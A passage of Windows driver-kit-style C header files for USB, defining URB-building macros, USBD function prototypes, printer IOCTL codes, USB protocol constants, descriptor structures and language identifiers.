(USB_BUSIFFN *USBC_PDO_ENABLE_CALLBACK)(
  IN PVOID  Context,
  IN USHORT FirstInterfaceNumber,
  IN USHORT NumberOfInterfaces,
  IN UCHAR  FunctionClass,
  IN UCHAR  FunctionSubClass,
  IN UCHAR  FunctionProtocol);

#define USBC_DEVICE_CONFIGURATION_INTERFACE_VERSION_1         0x0001

typedef struct _USBC_DEVICE_CONFIGURATION_INTERFACE_V1 {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  USBC_START_DEVICE_CALLBACK StartDeviceCallback;
  USBC_PDO_ENABLE_CALLBACK   PdoEnableCallback;
  PVOID Reserved[7];
} USBC_DEVICE_CONFIGURATION_INTERFACE_V1, *PUSBC_DEVICE_CONFIGURATION_INTERFACE_V1;

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */


```

`include/ddk/usbdlib.h`:

```h
#pragma once

#ifndef DECLSPEC_EXPORT
#define DECLSPEC_EXPORT __declspec(dllexport)
#endif

typedef struct _USBD_INTERFACE_LIST_ENTRY {
  PUSB_INTERFACE_DESCRIPTOR InterfaceDescriptor;
  PUSBD_INTERFACE_INFORMATION Interface;
} USBD_INTERFACE_LIST_ENTRY, *PUSBD_INTERFACE_LIST_ENTRY;

#define UsbBuildInterruptOrBulkTransferRequest(urb,length, pipeHandle, transferBuffer, transferBufferMDL, transferBufferLength, transferFlags, link) \
{												\
	(urb)->UrbHeader.Function = URB_FUNCTION_BULK_OR_INTERRUPT_TRANSFER;			\
	(urb)->UrbHeader.Length = (length);							\
	(urb)->UrbBulkOrInterruptTransfer.PipeHandle = (pipeHandle);				\
	(urb)->UrbBulkOrInterruptTransfer.TransferBufferLength = (transferBufferLength);	\
	(urb)->UrbBulkOrInterruptTransfer.TransferBufferMDL = (transferBufferMDL);		\
	(urb)->UrbBulkOrInterruptTransfer.TransferBuffer = (transferBuffer);			\
	(urb)->UrbBulkOrInterruptTransfer.TransferFlags = (transferFlags);			\
	(urb)->UrbBulkOrInterruptTransfer.UrbLink = (link);					\
}

#define UsbBuildGetDescriptorRequest(urb, length, descriptorType, descriptorIndex, languageId, transferBuffer, transferBufferMDL, transferBufferLength, link) \
{												\
	(urb)->UrbHeader.Function =  URB_FUNCTION_GET_DESCRIPTOR_FROM_DEVICE;			\
	(urb)->UrbHeader.Length = (length);							\
	(urb)->UrbControlDescriptorRequest.TransferBufferLength = (transferBufferLength);	\
	(urb)->UrbControlDescriptorRequest.TransferBufferMDL = (transferBufferMDL);		\
	(urb)->UrbControlDescriptorRequest.TransferBuffer = (transferBuffer);			\
	(urb)->UrbControlDescriptorRequest.DescriptorType = (descriptorType);			\
	(urb)->UrbControlDescriptorRequest.Index = (descriptorIndex);				\
	(urb)->UrbControlDescriptorRequest.LanguageId = (languageId);				\
	(urb)->UrbControlDescriptorRequest.UrbLink = (link);					\
}

#define UsbBuildGetStatusRequest(urb, op, index, transferBuffer, transferBufferMDL, link)	\
{												\
	(urb)->UrbHeader.Function =  (op);							\
	(urb)->UrbHeader.Length = sizeof(struct _URB_CONTROL_GET_STATUS_REQUEST);		\
	(urb)->UrbControlGetStatusRequest.TransferBufferLength = sizeof(USHORT);		\
	(urb)->UrbControlGetStatusRequest.TransferBufferMDL = (transferBufferMDL);		\
	(urb)->UrbControlGetStatusRequest.TransferBuffer = (transferBuffer);			\
	(urb)->UrbControlGetStatusRequest.Index = (index);					\
	(urb)->UrbControlGetStatusRequest.UrbLink = (link);					\
}

#define UsbBuildFeatureRequest(urb, op, featureSelector, index, link)				\
{												\
	(urb)->UrbHeader.Function =  (op);							\
	(urb)->UrbHeader.Length = sizeof(struct _URB_CONTROL_FEATURE_REQUEST);			\
	(urb)->UrbControlFeatureRequest.FeatureSelector = (featureSelector);			\
	(urb)->UrbControlFeatureRequest.Index = (index);					\
	(urb)->UrbControlFeatureRequest.UrbLink = (link);					\
}

#define UsbBuildSelectConfigurationRequest(urb, length, configurationDescriptor)		\
{												\
	(urb)->UrbHeader.Function =  URB_FUNCTION_SELECT_CONFIGURATION;				\
	(urb)->UrbHeader.Length = (length);							\
	(urb)->UrbSelectConfiguration.ConfigurationDescriptor = (configurationDescriptor);	\
}

#define UsbBuildSelectInterfaceRequest(urb, length, configurationHandle, interfaceNumber, alternateSetting) \
{												\
	(urb)->UrbHeader.Function =  URB_FUNCTION_SELECT_INTERFACE;				\
	(urb)->UrbHeader.Length = (length);							\
	(urb)->UrbSelectInterface.Interface.AlternateSetting = (alternateSetting);		\
	(urb)->UrbSelectInterface.Interface.InterfaceNumber = (interfaceNumber);		\
	(urb)->UrbSelectInterface.Interface.Length =						\
		(length - sizeof(struct _URB_HEADER) - sizeof(USBD_CONFIGURATION_HANDLE));	\
	(urb)->UrbSelectInterface.ConfigurationHandle = (configurationHandle);			\
}

#define UsbBuildVendorRequest(urb, cmd, length, transferFlags, reservedbits, request, value, index, transferBuffer, transferBufferMDL, transferBufferLength, link) \
{												\
	(urb)->UrbHeader.Function =  cmd;							\
	(urb)->UrbHeader.Length = (length);							\
	(urb)->UrbControlVendorClassRequest.TransferBufferLength = (transferBufferLength);	\
	(urb)->UrbControlVendorClassRequest.TransferBufferMDL = (transferBufferMDL);		\
	(urb)->UrbControlVendorClassRequest.TransferBuffer = (transferBuffer);			\
	(urb)->UrbControlVendorClassRequest.RequestTypeReservedBits = (reservedbits);		\
	(urb)->UrbControlVendorClassRequest.Request = (request);				\
	(urb)->UrbControlVendorClassRequest.Value = (value);					\
	(urb)->UrbControlVendorClassRequest.Index = (index);					\
	(urb)->UrbControlVendorClassRequest.TransferFlags = (transferFlags);			\
	(urb)->UrbControlVendorClassRequest.UrbLink = (link);					\
}

#if (NTDDI_VERSION >= NTDDI_WINXP)

#define UsbBuildOsFeatureDescriptorRequest(urb, length, interface, index, transferBuffer, transferBufferMDL, transferBufferLength, link)  \
{												\
	(urb)->UrbHeader.Function = URB_FUNCTION_GET_MS_FEATURE_DESCRIPTOR;			\
	(urb)->UrbHeader.Length = (length);							\
	(urb)->UrbOSFeatureDescriptorRequest.TransferBufferLength = (transferBufferLength);	\
	(urb)->UrbOSFeatureDescriptorRequest.TransferBufferMDL = (transferBufferMDL);		\
	(urb)->UrbOSFeatureDescriptorRequest.TransferBuffer = (transferBuffer);			\
	(urb)->UrbOSFeatureDescriptorRequest.InterfaceNumber = (interface);			\
	(urb)->UrbOSFeatureDescriptorRequest.MS_FeatureDescriptorIndex = (index);		\
	(urb)->UrbOSFeatureDescriptorRequest.UrbLink = (link);					\
}

#endif	/* NTDDI_VERSION >= NTDDI_WINXP */

#define URB_STATUS(urb)					((urb)->UrbHeader.Status)

#define GET_SELECT_CONFIGURATION_REQUEST_SIZE(totalInterfaces, totalPipes)			\
	(sizeof(struct _URB_SELECT_CONFIGURATION) +						\
	  ((totalInterfaces-1) * sizeof(USBD_INTERFACE_INFORMATION)) +				\
	  ((totalPipes-totalInterfaces)*sizeof(USBD_PIPE_INFORMATION)))

#define GET_SELECT_INTERFACE_REQUEST_SIZE(totalPipes)						\
	(sizeof(struct _URB_SELECT_INTERFACE) +							\
	  ((totalPipes-1)*sizeof(USBD_PIPE_INFORMATION)))

#define GET_USBD_INTERFACE_SIZE(numEndpoints) (sizeof(USBD_INTERFACE_INFORMATION) +		\
	(sizeof(USBD_PIPE_INFORMATION)*(numEndpoints))						\
	  - sizeof(USBD_PIPE_INFORMATION))

#define  GET_ISO_URB_SIZE(n) (sizeof(struct _URB_ISOCH_TRANSFER)+				\
			      sizeof(USBD_ISO_PACKET_DESCRIPTOR)*n)

#ifndef _USBD_

DECLSPEC_IMPORT
VOID
NTAPI
USBD_GetUSBDIVersion(
  OUT PUSBD_VERSION_INFORMATION VersionInformation);

DECLSPEC_IMPORT
PUSB_INTERFACE_DESCRIPTOR
NTAPI
USBD_ParseConfigurationDescriptor(
  IN PUSB_CONFIGURATION_DESCRIPTOR ConfigurationDescriptor,
  IN UCHAR InterfaceNumber,
  IN UCHAR AlternateSetting);

DECLSPEC_IMPORT
PURB
NTAPI
USBD_CreateConfigurationRequest(
  IN  PUSB_CONFIGURATION_DESCRIPTOR ConfigurationDescriptor,
  OUT PUSHORT Siz);

DECLSPEC_IMPORT
PUSB_COMMON_DESCRIPTOR
NTAPI
USBD_ParseDescriptors(
  IN PVOID DescriptorBuffer,
  IN ULONG TotalLength,
  IN PVOID StartPosition,
  IN LONG DescriptorType);

DECLSPEC_IMPORT
PUSB_INTERFACE_DESCRIPTOR
NTAPI
USBD_ParseConfigurationDescriptorEx(
  IN PUSB_CONFIGURATION_DESCRIPTOR ConfigurationDescriptor,
  IN PVOID StartPosition,
  IN LONG InterfaceNumber,
  IN LONG AlternateSetting,
  IN LONG InterfaceClass,
  IN LONG InterfaceSubClass,
  IN LONG InterfaceProtocol);

DECLSPEC_IMPORT
PURB
NTAPI
USBD_CreateConfigurationRequestEx(
  IN PUSB_CONFIGURATION_DESCRIPTOR ConfigurationDescriptor,
  IN PUSBD_INTERFACE_LIST_ENTRY InterfaceList);

DECLSPEC_EXPORT
ULONG
NTAPI
USBD_GetInterfaceLength(
  IN PUSB_INTERFACE_DESCRIPTOR InterfaceDescriptor,
  IN PUCHAR BufferEnd);

DECLSPEC_EXPORT
VOID
NTAPI
USBD_RegisterHcFilter(
  IN PDEVICE_OBJECT DeviceObject,
  IN PDEVICE_OBJECT FilterDeviceObject);

DECLSPEC_EXPORT
NTSTATUS
NTAPI
USBD_GetPdoRegistryParameter(
  IN PDEVICE_OBJECT PhysicalDeviceObject,
  IN OUT PVOID Parameter,
  IN ULONG ParameterLength,
  IN PWSTR KeyName,
  IN ULONG KeyNameLength);

DECLSPEC_EXPORT
NTSTATUS
NTAPI
USBD_QueryBusTime(
  IN PDEVICE_OBJECT RootHubPdo,
  OUT PULONG CurrentFrame);

#if (NTDDI_VERSION >= NTDDI_WINXP)

DECLSPEC_IMPORT
ULONG
NTAPI
USBD_CalculateUsbBandwidth(
  IN ULONG MaxPacketSize,
  IN UCHAR EndpointType,
  IN BOOLEAN LowSpeed);

#endif

#if (NTDDI_VERSION >= NTDDI_VISTA)

DECLSPEC_IMPORT
USBD_STATUS
NTAPI
USBD_ValidateConfigurationDescriptor(
  IN PUSB_CONFIGURATION_DESCRIPTOR ConfigDesc,
  IN ULONG BufferLength,
  IN USHORT Level,
  OUT PUCHAR *Offset,
  IN ULONG Tag OPTIONAL);

#endif

#endif /* ! _USBD_ */


```

`include/ddk/usbdrivr.h`:

```h
#pragma once

#define USB_KERNEL_IOCTL
#include "usbioctl.h"
#undef USB_KERNEL_IOCTL

#include "usb.h"
#include "usbdlib.h"
#include "usbbusif.h"

```

`include/ddk/usbkern.h`:

```h
#pragma once

#include "usbiodef.h"

```

`include/ddk/usbprint.h`:

```h
#define USBPRINT_IOCTL_INDEX  0x0000

#define IOCTL_USBPRINT_GET_LPT_STATUS \
                     CTL_CODE(FILE_DEVICE_UNKNOWN, USBPRINT_IOCTL_INDEX+12, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_USBPRINT_GET_1284_ID \
                     CTL_CODE(FILE_DEVICE_UNKNOWN, USBPRINT_IOCTL_INDEX+13, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_USBPRINT_VENDOR_SET_COMMAND \
                     CTL_CODE(FILE_DEVICE_UNKNOWN, USBPRINT_IOCTL_INDEX+14, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_USBPRINT_VENDOR_GET_COMMAND \
                      CTL_CODE(FILE_DEVICE_UNKNOWN, USBPRINT_IOCTL_INDEX+15, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_USBPRINT_SOFT_RESET \
                      CTL_CODE(FILE_DEVICE_UNKNOWN, USBPRINT_IOCTL_INDEX+16, METHOD_BUFFERED, FILE_ANY_ACCESS)

```

`include/ddk/usbprotocoldefs.h`:

```h
#pragma once

#include <pshpack1.h>

#define USB_UnConnected_Device_Address		0
#define USB_UNCONNECTED_ADDRESS(address)	(USB_UnConnected_Device_Address == (address))
#define USB_CONNECTED_ADDRESS(address)		(USB_UnConnected_Device_Address != (address))

#define PID_OUT					1
#define PID_IN					9
#define PID_SOF					5
#define PID_SETUP				13

#define PID_DATA0				3
#define PID_DATA1				11
#define PID_DATA2				7
#define PID_MDATA				15

#define USB_ACK					2
#define USB_NAK					10
#define USB_STALL				14
#define USB_NYET				6

#define USB_PRE					12
#define USB_ERR					12
#define USB_SPLIT				8
#define USB_PING				4

#define USB_TIMEOUT				0

#define USB_SPEC				0x0200
#define HID_SPEC				0x0101

#define USB_20_SPEC				0x0200
#define USB_11_SPEC				0x0110
#define USB_10_SPEC				0x0100

#define HID_MAX_PACKET_SIZE0			0x08
#define MICROSOFT_VENDOR_ID			0x045E
#define HID_DEVICE_RELEASE			0x0100

#define HID_MAX_PACKET_SIZE			0x0008
#define HID_POLLING_INTERVAL			0x0A
#define MAX_POLLING_INTERVAL			0xFF

#define USB_DEFAULT_KEYBOARD_PRODUCT_ID		0x000B
#define USB_DEFAULT_MOUSE_PRODUCT_ID		0x0040

#define DEVICE_DESCRIPTOR			0x01
#define CONFIGURATION_DESCRIPTOR		0x02
#define STRING_DESCRIPTOR			0x03
#define INTERFACE_DESCRIPTOR			0x04
#define ENDPOINT_DESCRIPTOR			0x05
#define QUALIFIER_DESCRIPTOR			0x06
#define OTHER_SPEED_DESCRIPTOR			0x07
#define INTERFACE_POWER_DESCRIPTOR		0x08

#define HID_DESCRIPTOR				0x21
#define REPORT_DESCRIPTOR			0x22
#define PHYSICAL_DESCRIPTOR			0x23
#define HUB_DESCRIPTOR				0x29

#define USB_DESCRIPTOR_TYPE_STD			0
#define USB_DESCRIPTOR_TYPE_CLASS		1
#define USB_DESCRIPTOR_TYPE_VENDOR		2
#define USB_DESCRIPTOR_TYPE_RESERVED		3

#define DIR_HOST_TO_DEVICE			0
#define DIR_DEVICE_TO_HOST			1

#define TYPE_STANDARD				0
#define TYPE_CLASS				1
#define TYPE_VENDOR				2
#define TYPE_RESERVED				3

#define RCPT_DEVICE				0
#define RCPT_INTERFACE				1
#define RCPT_ENDPOINT				2
#define RCPT_OTHER				3
#define RCPT_PORT				4
#define RCPT_RPIPE				5

#if !defined(MIDL_PASS)
#define USB_MAKE_REQUEST_TYPE(direction, type, recipient)		\
		(BYTE)( ((BYTE)direction << 7) |			\
			((BYTE)type << 5) | ((BYTE)recipient & 0x07) )
#endif

#define GET_STATUS				0
#define CLEAR_FEATURE				1
#define SET_FEATURE				3
#define SET_ADDRESS				5
#define GET_DESCRIPTOR				6
#define SET_DESCRIPTOR				7
#define GET_CONFIGURATION			8
#define SET_CONFIGURATION			9
#define GET_INTERFACE				10
#define SET_INTERFACE				11
#define SYNCH_FRAME				12

#define USB_BULK_ONLY_MASS_STG_RESET		0xFF
#define USB_BULK_ONLY_MASS_STG_GET_MAX_LUN	0xFE

#define GET_REPORT				0x01
#define GET_IDLE				0x02
#define GET_PROTOCOL				0x03
#define SET_REPORT				0x09
#define SET_IDLE				0x0A
#define SET_PROTOCOL				0x0B

#define ADD_MMC_IE				20
#define REMOVE_MMC_IE				21
#define SET_NUM_DNTS				22
#define SET_CLUSTER_ID				23
#define SET_DEVICE_INFO				24
#define GET_TIME				25
#define SET_STREAM_INDEX			26
#define SET_WUSB_MAS				27
#define WUSB_CH_STOP				28

#define EXEC_RC_CMD				40

#define TIME_ADJ				0x01
#define TIME_BPST				0x02
#define TIME_WUSB				0x03

#define HID_REPORT_TYPE_INPUT			0x01
#define HID_REPORT_TYPE_OUTPUT			0x02
#define HID_REPORT_TYPE_FEATURE			0x03

#define HID_PROTOCOL_TYPE_BOOT			0x00
#define HID_PROTOCOL_TYPE_REPORT		0x01

#define HUB_DEVICE_PROTOCOL_1X			0
#define HUB_DEVICE_PROTOCOL_SINGLE_TT		1
#define HUB_DEVICE_PROTOCOL_MULTI_TT		2

#define HUB_INTERFACE_PROTOCOL_1X				0
#define HUB_INTERFACE_PROTOCOL_SINGLE_TT			0
#define HUB_INTERFACE_PROTOCOL_MULTI_TT_IN_SINGLE_TT_MODE	1
#define HUB_INTERFACE_PROTOCOL_MULTI_TT_IN_MULTI_TT_MODE	2

#define CLEAR_TT_BUFFER				8
#define RESET_TT				9
#define GET_TT_STATE				10
#define STOP_TT					11

#define C_HUB_LOCAL_POWER			0
#define C_HUB_OVER_CURRENT			1
#define PORT_CONNECTION				0
#define PORT_ENABLE				1
#define PORT_SUSPEND				2
#define PORT_OVER_CURRENT			3
#define PORT_RESET				4
#define PORT_POWER				8
#define PORT_LOW_SPEED				9
#define C_PORT_CONNECTION			16
#define C_PORT_ENABLE				17
#define C_PORT_SUSPEND				18
#define C_PORT_OVER_CURRENT			19
#define C_PORT_RESET				20
#define PORT_TEST				21
#define PORT_INDICATOR				22

#define USBSETUPSIZE				8
#define USBINREQUEST				128

#define BM_GET_DEVICE				128
#define BM_GET_INTERFACE			129
#define BM_GET_ENDPOINT				130

#define BM_SET_DEVICE				0
#define BM_SET_INTERFACE			1
#define BM_SET_ENDPOINT				2

#define HALT_ENDPOINT				0
#define REMOTE_WAKEUP				1
#define TEST_MODE				2

#define DEVICE_DESCRIPTION_TYPE			0x100
#define QUALIFIER_DESCRIPTION_TYPE		0x600
#define OTHER_SPEED_DESCRIPTION_TYPE		0x700
#define CONFIG_DESCRIPTION_TYPE			0x200
#define STRING_DESCRIPTION_TYPE			0x300
#define MSOS_DESCRIPTION_TYPE			0x3EE

#define CONFIG_BUS_POWERED			0x80
#define CONFIG_SELF_POWERED			0x40
#define CONFIG_REMOTE_WAKEUP			0x20

#define USB_WA_MULTIFUNCTION			0x02
#define USB_WA_PROTOCOL				0x01
#define USB_RADIO_CONTROL			0x2

#define USB_HID_CLASS_CODE			0x03
#define USB_MASS_STORAGE_CLASS_CODE		0x08
#define USB_HUB_CLASS_CODE			0x09
#define USB_MISCELLANEOUS			0xEF
#define USB_WIRELESS_WA				0xE0

#define BOOT_INTERFACE_SUBCLASS			0x01
#define COMMON_CLASS				0x02
#define USB_RF_CONTROL				0x01

#define PROTOCOL_NONE				0x00
#define PROTOCOL_KEYBOARD			0x01
#define PROTOCOL_MOUSE				0x02

#define EP_OUT					0
#define EP_IN					1

#define MAKE_ENDPOINT_ADDRESS(num, dir)				\
		( ((BYTE)(dir) << 7) | ((BYTE)(num) & 0x0F) )

#define ENDPOINT_TYPE				0x03
#define CONTROL_ENDPOINT			0
#define ISOCHRONOUS_ENDPOINT			1
#define BULK_ENDPOINT				2
#define INTERRUPT_ENDPOINT			3

typedef union _USBDESCRIPTORTYPE {
  BYTE Byte;
#if !defined(MIDL_PASS)
  struct Bits {
    BYTE Descriptor:5;
    BYTE Type:2;
    BYTE Reserved:1;
  } Bits;
#endif
} USBDESCRIPTORTYPE;

typedef union _USBCONFIGATTRIBS {
  BYTE Byte;
#if !defined(MIDL_PASS)
  struct Bits {
    BYTE bReserved0_4:5;
    BYTE bRemoteWakeup:1;
    BYTE bSelfPowered:1;
    BYTE bReserved7:1;
  } Bits;
#endif
} USBCONFIGATTRIBS;

typedef union _USBREQUESTTYPE {
  BYTE Byte;
#if !defined(MIDL_PASS)
  struct Bits {
    BYTE Recipient:5;
    BYTE Type:2;
    BYTE Direction:1;
    } Bits;
#endif
} USBREQUESTTYPE;

#if !defined(MIDL_PASS)
C_ASSERT((sizeof(USBREQUESTTYPE) == sizeof(BYTE)));
#endif

typedef struct _USBSETUPREQUEST {
  USBREQUESTTYPE bmRequestType;
  BYTE bRequest;
  SHORT sSetupValue;
  SHORT sSetupIndex;
  SHORT sSetupLength;
} USBSETUPREQUEST;

#if !defined(MIDL_PASS)

typedef struct _USBDEVICEDESC {
  BYTE bLength;
  BYTE bDescriptorType;
  USHORT usUSB;
  BYTE bDeviceClass;
  BYTE bDeviceSubClass;
  BYTE bProtocol;
  BYTE bMaxPacket0;
  USHORT usVendor;
  USHORT usProduct;
  USHORT usDeviceNumber;
  BYTE bManufacturer;
  BYTE bProductDesc;
  BYTE bSerialNumber;
  BYTE bNumConfigs;
} USBDEVICEDESC;

typedef struct _USBCONFIGDESC {
  BYTE bLength;
  BYTE bDescriptorType;
  USHORT usTotalLength;
  BYTE bNumInterfaces;
  BYTE bConfigValue;
  BYTE bConfig;
  BYTE bAttributes;
  BYTE bMaxPower;
} USBCONFIGDESC;


typedef struct _USBINTERFACEDESC {
  BYTE bLength;
  BYTE bDescriptorType;
  BYTE bInterfaceNumber;
  BYTE bAlternateSetting;
  BYTE bNumEndpoints;
  BYTE bClass;
  BYTE bSubClass;
  BYTE bProtocol;
  BYTE bDescription;
} USBINTERFACEDESC;

#define ENDPOINT_DIRECTION_OUT			0
#define ENDPOINT_DIRECTION_IN			1

typedef union _USBENDPOINTADDRESS {
  BYTE Byte;
  struct Bits {
    BYTE Number:4;
    BYTE Reserved:3;
    BYTE Direction:1;
  } Bits;
} USBENDPOINTADDRESS;

C_ASSERT((sizeof(USBENDPOINTADDRESS) == sizeof(BYTE)));

#define USB_TRANSFER_TYPE_CONTROL		0
#define USB_TRANSFER_TYPE_ISOCH			1
#define USB_TRANSFER_TYPE_BULK			2
#define USB_TRANSFER_TYPE_INTERRUPT		3

#define USB_SYNC_TYPE_NONE			0
#define USB_SYNC_TYPE_ASYNC			1
#define USB_SYNC_TYPE_ADAPTIVE			2
#define USB_SYNC_TYPE_SYNC			3

#define USB_USAGE_TYPE_DATA			0
#define USB_USAGE_TYPE_FEEDBACK			1
#define USB_USAGE_TYPE_IMPLICIT			2
#define USB_USAGE_TYPE_RESERVED			3

typedef union _USBENDPOINTATTRIBS {
  BYTE Byte;
  struct Bits {
    BYTE TransferType:2;
    BYTE SyncType:2;
    BYTE UsageType:2;
    BYTE Reserved:2;
  } Bits;
} USBENDPOINTATTRIBS;

C_ASSERT((sizeof(USBENDPOINTATTRIBS) == sizeof(BYTE)));

typedef union _USBMAXPACKET {
  WORD Word;
  struct Bits {
    WORD Size:11;
    WORD AdditionalXactions:2;
    WORD Reserved:3;
  } Bits;
} USBMAXPACKET;

C_ASSERT((sizeof(USBMAXPACKET) == sizeof(WORD)));

typedef struct _USBENDPOINTDESC {
  BYTE bLength;
  BYTE bDescriptorType;
  USBENDPOINTADDRESS Address;
  USBENDPOINTATTRIBS Attributes;
  USBMAXPACKET MaxPacket;
  BYTE bInterval;
} USBENDPOINTDESC;

typedef struct _USBQUALIFIERDESC {
  BYTE bLength;
  BYTE bDescriptorType;
  USHORT usUSB;
  BYTE bDeviceClass;
  BYTE bDeviceSubClass;
  BYTE bProtocol;
  BYTE bMaxPacket;
  BYTE bNumConfigs;
  BYTE bReserved;
} USBQUALIFIERDESC;

typedef struct _USBSTRINGDESC {
  BYTE bLength;
  BYTE bDescriptorType;
  WCHAR wchData[1];
} USBSTRINGDESC;

typedef struct _USBSTRINGLANGIDS {
  BYTE bLength;
  BYTE bDescriptorType;
  WORD wLANGIDs[1];
} USBSTRINGLANGIDS;

typedef struct _USBHIDSTANDARDDESC {
  BYTE bLength;
  BYTE bDescriptorType;
  USHORT bcdHID;
  BYTE bCountryCode;
  BYTE bNumDescriptors;
} USBHIDSTANDARDDESC;

typedef struct _USBHIDOPTIONALDESC {
  BYTE bClassDescriptorType;
  USHORT usDescriptorLength;
} USBHIDOPTIONALDESC;

typedef struct _USBPHYSICALDESCSET0 {
  BYTE bNumber;
  BYTE bLength;
} USBPHYSICALDESCSET0;

typedef union _USBPHYSICALDESCSET {
  BYTE bPhysicalInfo;
  struct Bits {
    BYTE bPreference:5;
    BYTE bBias:3;
    } Bits;
} USBPHYSICALDESCSET;

typedef struct _USBPHYSICALDESCITEM {
  BYTE bDesignator;
  union Flags {
    BYTE bFlags;
    struct Bits {
        BYTE bEffort:5;
        BYTE bQualifier:3;
    } Bits;
  } Flags;
} USBPHYSICALDESCITEM;

typedef union _USBHUBCHARACTERISTICS {
  WORD wHubCharacteristics;
  struct Bits {
    BYTE bLogicalPowerSwitchingMode:2;
    BYTE fCompoundDevice:1;
    BYTE bOverCurrentMode:2;
    BYTE bTTThinkTime:2;
    BYTE fPortIndicatorSupport:1;
    BYTE bReserved:8;
  } Bits;
} USBHUBCHARACTERISTICS;

#if !defined(MIDL_PASS)
C_ASSERT((sizeof(USBHUBCHARACTERISTICS) == sizeof(WORD)));
#endif

typedef struct _USBHUBDESC {
  BYTE bLength;
  BYTE bDescriptorType;
  BYTE bNumberOfPorts;
  USBHUBCHARACTERISTICS Characteristics;
  BYTE bPwrOn2PwrGood;
  BYTE bHubContrCurrent;
  BYTE bDeviceRemovable[32];
  BYTE bPortPwrCtrlMask[32];
} USBHUBDESC;

#if !defined(MIDL_PASS)
C_ASSERT((sizeof(USBHUBDESC) == 71));
#endif

typedef union _USBHUBPORTSTATUS {
  WORD wPortStatus;
  struct Bits {
    BYTE fCurrentConnectionStatus:1;
    BYTE fEnabled:1;
    BYTE fSuspend:1;
    BYTE fOverCurrent:1;
    BYTE fReset:1;
    BYTE bReserved1:3;
    BYTE fPortPower:1;
    BYTE fLowSpeedDevice:1;
    BYTE fHighSpeedDevice:1;
    BYTE fTestMode:1;
    BYTE fPortIndicatorControl:1;
    BYTE bReserved2:3;
  } Bits;
} USBHUBPORTSTATUS;

#if !defined(MIDL_PASS)
C_ASSERT((sizeof(USBHUBPORTSTATUS) == sizeof(WORD)));
#endif

typedef union _USBHUBPORTSTATUSCHANGE {
  WORD wPortStatusChange;
  struct Bits {
    BYTE fConnectionStatusChange:1;
    BYTE fEnabledChange:1;
    BYTE fSuspendChange:1;
    BYTE fOverCurrentChange:1;
    BYTE fResetChange:1;
    BYTE bReserved1:3;
    BYTE bReserved2:8;
  } Bits;
} USBHUBPORTSTATUSCHANGE;

#if !defined(MIDL_PASS)
C_ASSERT((sizeof(USBHUBPORTSTATUSCHANGE) == sizeof(WORD)));
#endif

typedef struct _USBHUBPORTDATA {
  USBHUBPORTSTATUS PortStatus;
  USBHUBPORTSTATUSCHANGE PortStatusChange;
} USBHUBPORTDATA;

#define USB_MAKE_LANGID(lang, sublang)					\
		((((USHORT)(sublang)) << 10) | (USHORT)(lang))

#define USB_LANG_RESERVED			0x00
#define USB_LANG_ARABIC				0x01
#define USB_LANG_BULGARIAN			0x02
#define USB_LANG_CATALAN			0x03
#define USB_LANG_CHINESE			0x04
#define USB_LANG_CZECH				0x05
#define USB_LANG_DANISH				0x06
#define USB_LANG_GERMAN				0x07
#define USB_LANG_GREEK				0x08
#define USB_LANG_ENGLISH			0x09
#define USB_LANG_SPANISH			0x0a
#define USB_LANG_FINNISH			0x0b
#define USB_LANG_FRENCH				0x0c
#define USB_LANG_HEBREW				0x0d
#define USB_LANG_HUNGARIAN			0x0e
#define USB_LANG_ICELANDIC			0x0f
#define USB_LANG_ITALIAN			0x10
#define USB_LANG_JAPANESE			0x11
#define USB_LANG_KOREAN				0x12
#define USB_LANG_DUTCH				0x13
#define USB_LANG_NORWEGIAN			0x14
#define USB_LANG_POLISH				0x15
#define USB_LANG_PORTUGUESE			0x16
#define USB_LANG_ROMANIAN			0x18
#define USB_LANG_RUSSIAN			0x19
#define USB_LANG_CROATIAN			0x1a
#define USB_LANG_SERBIAN			0x1a
#define USB_LANG_SLOVAK				0x1b
#define USB_LANG_ALBANIAN			0x1c
#define USB_LANG_SWEDISH			0x1d
#define USB_LANG_THAI				0x1e
#define USB_LANG_TURKISH			0x1f
#define USB_LANG_URDU				0x20
#define USB_LANG_INDONESIAN			0x21
#define USB_LANG_UKRANIAN			0x22
#define USB_LANG_BELARUSIAN			0x23
#define USB_LANG_SLOVENIAN			0x24
#define USB_LANG_ESTONIAN			0x25
#define USB_LANG_LATVIAN			0x26
#define USB_LANG_LITHUANIAN			0x27
#define USB_LANG_FARSI				0x29
#define USB_LANG_VIETNAMESE			0x2a
#define USB_LANG_ARMENIAN			0x2b
#define USB_LANG_AZERI				0x2c
#define USB_LANG_BASQUE				0x2d
#define USB_LANG_MACEDONIAN			0x2f
#define USB_LANG_AFRIKAANS			0x36
#define USB_LANG_GEORGIAN			0x37
#define USB_LANG_FAEROESE			0x38
#define USB_LANG_HINDI				0x39
#define USB_LANG_MALAY				0x3e
#define USB_LANG_KAZAK				0x3f
#define USB_LANG_SWAHILI			0x41
#define USB_LANG_UZBEK				0x43
#define USB_LANG_TATAR				0x44
#define USB_LANG_BENGALI			0x45
#define USB_LANG_PUNJABI			0x46
#define USB_LANG_GUJARATI			0x47
#define USB_LANG_ORIYA				0x48
#define USB_LANG_TAMIL				0x49
#define USB_LANG_TELUGU				0x4a
#define USB_LANG_KANNADA			0x4b
#define USB_LANG_MALAYALAM			0x4c
#define USB_LANG_ASSAMESE			0x4d
#define USB_LANG_MARATHI			0x4e
#define USB_LANG_SANSKRIT			0x4f
#define USB_LANG_KONKANI			0x57
#define USB_LANG_MANIPURI			0x58
#define USB_LANG_SINDHI				0x59
#define USB_LANG_KASHMIRI			0x60
#define USB_LANG_NEPALI				0x61
#define USB_LANG_HID				0xff

#define USB_SUBLANG_ARABIC_SAUDI_ARABIA		0x01
#define USB_SUBLANG_ARABIC_SAUDI_ARABIA		0x01
#define USB_SUBLANG_ARABIC_IRAQ			0x02
#define USB_SUBLANG_ARABIC_EGYPT		0x03
#define USB_SUBLANG_ARABIC_LIBYA		0x04
#define USB_SUBLANG_ARABIC_ALGERIA		0x05
#define USB_SUBLANG_ARABIC_MOROCCO		0x06
#define USB_SUBLANG_ARABIC_TUNISIA		0x07
#define USB_SUBLANG_ARABIC_OMAN			0x08
#define USB_SUBLANG_ARABIC_YEMEN		0x09
#define USB_SUBLANG_ARABIC_SYRIA		0x10
